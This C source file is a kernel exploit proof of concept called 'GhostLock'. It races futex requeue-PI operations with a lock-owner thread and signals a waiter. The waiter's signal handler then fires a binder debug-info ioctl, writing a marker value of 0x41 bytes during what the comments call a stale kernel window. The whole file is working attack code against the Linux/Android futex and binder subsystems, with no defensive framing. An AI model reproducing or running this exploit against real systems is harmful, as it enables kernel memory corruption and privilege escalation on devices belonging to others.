/**
 * ghostlock_binder_signal_cfu.c — CFU from signal handler after GhostLock requeue
 *
 * Fire BINDER_GET_NODE_DEBUG_INFO inside SIGUSR1 handler so the write happens
 * on the waiter thread as soon as the kernel delivers the signal after requeue
 * (stale window / residual), without waiting for full timeout cleanup.
 */
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <pthread.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <unistd.h>

#define BINDER_GET_NODE_DEBUG_INFO                                             \
  (((3u) << 30) | ((24u) << 16) | (('b') << 8) | 11)

struct binder_node_debug_info {
  uint64_t ptr;
  uint64_t cookie;
  uint32_t has_strong_ref;
  uint32_t has_weak_ref;
} __attribute__((packed));

static uint32_t f_wait __attribute__((aligned(4096)));
static uint32_t f_pi_target __attribute__((aligned(4096)));
static uint32_t f_pi_chain __attribute__((aligned(4096)));
static volatile int ready, owner_ok, requeued, cfu_done, done;
static int g_bfd = -1;
static volatile int cfu_ret, cfu_err;

static long futex(uint32_t *u, int op, uint32_t val, void *to, uint32_t *u2,
                  uint32_t v3) {
  return syscall(SYS_futex, u, op, val, to, u2, v3);
}

static void on_sigusr1(int sig) {
  (void)sig;
  struct binder_node_debug_info info = {
      .ptr = 0,
      .cookie = 0x4141414141414141ULL,
      .has_strong_ref = 0,
      .has_weak_ref = 0,
  };
  errno = 0;
  cfu_ret = ioctl(g_bfd, BINDER_GET_NODE_DEBUG_INFO, &info);
  cfu_err = errno;
  cfu_done = 1;
}

static void *waiter(void *a) {
  (void)a;
  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_handler = on_sigusr1;
  sigemptyset(&sa.sa_mask);
  sigaction(SIGUSR1, &sa, NULL);

  g_bfd = open("/dev/binder", O_RDWR);
  if (g_bfd < 0) {
    printf("binder open errno=%d\n", errno);
    done = 1;
    return 0;
  }

  futex(&f_pi_chain, FUTEX_LOCK_PI, 0, 0, 0, 0);
  ready = 1;
  while (!owner_ok)
    usleep(100);

  printf("[waiter] entering WAIT_REQUEUE_PI (no timeout)\n");
  long r = futex(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, NULL, &f_pi_target, 0);
  printf("[waiter] WAIT returned ret=%ld errno=%d cfu_done=%d\n", r, errno,
         cfu_done);
  if (!cfu_done) {
    /* fallback if signal did not fire during wait */
    on_sigusr1(SIGUSR1);
    printf("[waiter] fallback CFU after return\n");
  }
  printf("[binder] CFU ret=%d errno=%d\n", cfu_ret, cfu_err);

  struct {
    uint32_t size;
    uint32_t sched_policy;
    uint64_t sched_flags;
    int32_t sched_nice;
    uint32_t sched_priority;
    uint64_t a, b, c;
    uint32_t d, e;
  } attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_nice = 7;
  r = syscall(274, 0, &attr, 0);
  printf("[pi] sched_setattr ret=%ld errno=%d\n", r, errno);

  close(g_bfd);
  futex(&f_pi_chain, FUTEX_UNLOCK_PI, 0, 0, 0, 0);
  done = 1;
  return 0;
}

static void *owner(void *a) {
  (void)a;
  futex(&f_pi_target, FUTEX_LOCK_PI, 0, 0, 0, 0);
  owner_ok = 1;
  while (!requeued)
    usleep(100);
  /* keep holding briefly, then unlock so waiter can complete */
  usleep(50000);
  futex(&f_pi_target, FUTEX_UNLOCK_PI, 0, 0, 0, 0);
  printf("[owner] unlocked target\n");
  while (!done)
    sleep(1);
  return 0;
}

int main(void) {
  printf("ghostlock_binder_signal_cfu\n\n");
  f_wait = f_pi_target = f_pi_chain = 0;

  pthread_t wt, ot;
  pthread_create(&wt, 0, waiter, 0);
  usleep(150000);
  pthread_create(&ot, 0, owner, 0);
  usleep(200000);

  for (int i = 0; i < 200; i++) {
    long r =
        futex(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
    if (r >= 0) {
      printf("[trigger] GhostLock ret=%ld — sending SIGUSR1\n", r);
      requeued = 1;
      usleep(1000);
      pthread_kill(wt, SIGUSR1);
      break;
    }
    usleep(500);
  }

  while (!done)
    sleep(1);
  pthread_join(wt, 0);
  pthread_join(ot, 0);
  printf("\n=== KERNEL SURVIVED ===\n");
  return 0;
}
